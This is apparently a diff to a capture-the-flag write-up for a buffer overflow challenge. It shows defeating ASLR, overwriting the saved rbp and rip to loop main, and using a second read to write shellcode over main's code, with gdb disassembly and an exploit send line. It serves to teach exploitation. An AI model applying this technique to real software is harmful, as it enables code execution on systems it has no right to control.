@@ -72,9 +72,47 @@ recv_buf = p.recv(64).split()
 start = int(recv_buf[3], 16)
 end = int(recv_buf[-1], 16)
 ```
-We can now use this as a base to calculate other addresses from and defeat ASLR. The first buffer overflow consists of a 16 bytes padding to fill up the pointer on the stack, the next 8 bytes will become the new rbp. The new rbp should point to after the read call in main plus 0x10, because rax will point here after we subtract 0x10. Then the second read call will overwrite the code here with our shell code.
-```
+We can now use this as a base to calculate other addresses from and defeat ASLR. The first buffer overflow consists of a 16 bytes padding to fill up the stack untill rbp, the next 8 bytes will become the new rbp. The new rbp should point to after the read call in main plus 0x10, because rax will point here after we subtract 0x10. Then the second read call will overwrite the code here with our shell code.
 
-```
-Now the second write call will place your shell code at the end of main.
-Then we set rip to `start+0x12d6+0x10`, 0x12d6 being the offset from the start of the code segment to `<main+27>`.
+The last 8 bytes from the first bufferoverflow will controll rip. We use this to redirct code execution back into main befor the read call.
+
+From the gdb disassemly of main we can see the offsets for the diffrent instructions.
+````
+   0x00000000000012a0 <+0>:	push   rbp
+   0x00000000000012a1 <+1>:	mov    rbp,rsp
+   0x00000000000012a4 <+4>:	sub    rsp,0x20
+   0x00000000000012a8 <+8>:	mov    DWORD PTR [rbp-0x4],0x0
+   0x00000000000012af <+15>:	call   0x1170 <init_buffering>
+   0x00000000000012b4 <+20>:	call   0x1200 <ropnop>
+   0x00000000000012b9 <+25>:	xor    edi,edi
+   0x00000000000012bb <+27>:	lea    rax,[rbp-0x10]
+   0x00000000000012bf <+31>:	mov    QWORD PTR [rbp-0x10],rax
+   0x00000000000012c3 <+35>:	mov    rax,QWORD PTR [rbp-0x10]
+   0x00000000000012c7 <+39>:	mov    rsi,rax
+   0x00000000000012ca <+42>:	mov    edx,0x1337
+   0x00000000000012cf <+47>:	call   0x1040 <read@plt>
+   0x00000000000012d4 <+52>:	xor    ecx,ecx
+   0x00000000000012d6 <+54>:	mov    QWORD PTR [rbp-0x18],rax
+   0x00000000000012da <+58>:	mov    eax,ecx
+   0x00000000000012dc <+60>:	add    rsp,0x20
+   0x00000000000012e0 <+64>:	pop    rbp
+   0x00000000000012e1 <+65>:	ret
+````
+So we compute the new rbp value like `rbp = start + 0x12d6 + 0x10` where start is the begining of the code segment. This will cause our 2. read to overwrite main starting at `main<+54>`.
+
+Now we calculate rip so the first read returns to `main<+25>` instead of `main<+52>` to call read again. In code it looks like this `rip = start + 0x12b9`
+
+We use the struct module to turn the integers rip and rbp to bytearrays and send the first input in the expoit script.
+````
+p.send(padding + rbp + rip)
+````
+
+Now we call read again from main, but this time our arguments look like this.
+
+````
+ ► 0x5635babeb2cf <main+47>    call   read@plt <0x5635babeb040>
+        fd: 0x0
+        buf: 0x5635babeb2d6 (main+54) ◂— 0x5635babeb2d6
+        nbytes: 0x1337
+````
+
